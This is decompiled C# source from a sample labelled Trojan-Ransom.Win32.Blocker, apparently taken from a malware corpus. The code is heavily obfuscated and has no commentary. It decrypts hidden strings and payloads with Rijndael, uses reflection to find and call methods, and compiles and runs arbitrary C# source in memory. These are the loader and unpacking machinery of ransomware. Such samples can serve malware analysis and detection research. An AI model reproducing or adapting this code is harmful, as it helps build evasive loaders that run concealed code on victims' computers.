// Decompiled with JetBrains decompiler
// Type: ?1?.?2?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCE56BF6-1478-4F80-8758-2108CD9D4C80
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jtre-eb5e0b099fc84d1d2c2bf7760be02cd5b14c59a9a1650c18de62d6fa9084bb85.exe

using \u003F1\u003F;
using \u003F15\u003F;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace \u003F1\u003F
{
  internal class \u003F2\u003F
  {
    private static \u003F5\u003F \u003F1\u003F = new \u003F5\u003F();

    public string \u003F1\u003F(string _param1)
    {
      string environmentVariable = Environment.GetEnvironmentVariable(_param1);
      Type type = typeof (\u003F2\u003F);
      MethodInfo methodInfo = (MethodInfo) null;
      foreach (MethodInfo method in type.GetMethods())
      {
        ParameterInfo[] parameters = method.GetParameters();
        if (parameters.Length == 3 && (object) parameters[0].ParameterType == (object) Type.GetType(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1457293294, 434692657, 306500893)))
        {
          string name = method.Name;
          methodInfo = method;
          break;
        }
      }
      object instance = Activator.CreateInstance(type);
      object[] parameters1 = new object[3]
      {
        (object) 1,
        (object) environmentVariable,
        (object) \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(152675451, 434692669, 306500875)
      };
      return (string) methodInfo.Invoke(instance, parameters1);
    }

    public string \u003F1\u003F(int _param1) => this.\u003F1\u003F(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1997256319, 434692681, 306500911)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1905579359, 434692689, 306500879), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(624609389, 434692689, 306500871)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1998467535, 434692697, 306500879), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1682635848, 434692697, 306500871)) == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(592061408, 434692707, 306500865) || this.\u003F1\u003F(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2108214918, 434692731, 306500895)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(80726061, 434692611, 306500879), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(104337562, 434692611, 306500871)).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1644009628, 434692619, 306500879), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(22562494, 434692619, 306500871)) != \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2087664149, 434692619, 306500871) ? \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(489025849, 434692631, 306500875) : \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1495307541, 434692635, 306500867);

    public string \u003F1\u003F(double _param1, string _param2, string _param3)
    {
      switch (_param2)
      {
        case null:
          return \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(787861490, 434692761, 306500879) + _param2 + \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(705834725, 434692769, 306500879);
        default:
          if (_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(133891247, 434692741, 306500875))
            return \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(2045766056, 434692753, 306500875);
          goto case null;
      }
    }

    public string \u003F1\u003F(int _param1, string _param2, string _param3)
    {
      switch (_param2)
      {
        case null:
          if (_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1328181377, 434692857, 306500895))
            return _param2 + (object) _param1;
          break;
      }
      return _param2 + _param3;
    }

    public string \u003F1\u003F(long _param1, string _param2, string _param3) => !(_param2.ToString() == \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1663799736, 434692833, 306500897)) ? _param2 + _param3 : _param2 + (object) _param1;

    public static string \u003F1\u003F(byte[] _param0, string _param1, string _param2) => Encoding.Unicode.GetString(\u003F2\u003F.\u003F15\u003F(_param0, _param1, _param2));

    public static byte[] \u003F15\u003F(byte[] _param0, string _param1, string _param2)
    {
      MemoryStream memoryStream1 = new MemoryStream(_param0);
      MemoryStream memoryStream2 = new MemoryStream();
      Rijndael rijndael = Rijndael.Create();
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(_param1, Encoding.ASCII.GetBytes(_param2));
      rijndael.Key = passwordDeriveBytes.GetBytes(32);
      rijndael.IV = passwordDeriveBytes.GetBytes(16);
      ICryptoTransform decryptor = rijndael.CreateDecryptor();
      \u003F36\u003F obj = new \u003F36\u003F((Stream) new CryptoStream((Stream) memoryStream1, decryptor, CryptoStreamMode.Read));
      byte[] buffer = new byte[2048];
      int count;
      do
      {
        count = obj.Read(buffer, 0, buffer.Length);
        memoryStream2.Write(buffer, 0, count);
      }
      while (count > 0);
      obj.Close();
      memoryStream2.Flush();
      memoryStream2.Close();
      return memoryStream2.ToArray();
    }

    public static string \u003F15\u003F(string _param0) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(\u003F2\u003F.\u003F16\u003F(_param0))).Replace(\u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(979847953, 434692927, 306500869), \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1889941188, 434692927, 306500871));

    private static byte[] \u003F16\u003F(string _param0) => new ASCIIEncoding().GetBytes(_param0);

    private static string \u003F1\u003F(byte[] _param0) => new ASCIIEncoding().GetString(_param0, 0, _param0.Length);

    public static object \u003F1\u003F(
      string _param0,
      string _param1,
      string _param2,
      string[] _param3,
      object[] _param4)
    {
      try
      {
        ICodeCompiler compiler = new CSharpCodeProvider().CreateCompiler();
        CompilerParameters options = new CompilerParameters();
        foreach (string str in _param3)
          options.ReferencedAssemblies.Add(str);
        options.GenerateInMemory = true;
        CompilerResults compilerResults = compiler.CompileAssemblyFromSource(options, _param0);
        if (!compilerResults.Errors.HasErrors)
        {
          object instance = compilerResults.CompiledAssembly.CreateInstance(_param1);
          if (instance != null)
            return instance.GetType().InvokeMember(_param2, BindingFlags.InvokeMethod, (Binder) null, instance, _param4);
        }
      }
      catch
      {
      }
      return (object) null;
    }

    public static object \u003F1\u003F(
      string _param0,
      string _param1,
      string[] _param2,
      object[] _param3)
    {
      string str = \u002E\u0024UNNAMED_TYPE\u0024.\u003F1\u003F(1280773094, 434692921, 306500929);
      return \u003F2\u003F.\u003F1\u003F(_param0, str, _param1, _param2, _param3);
    }
  }
}
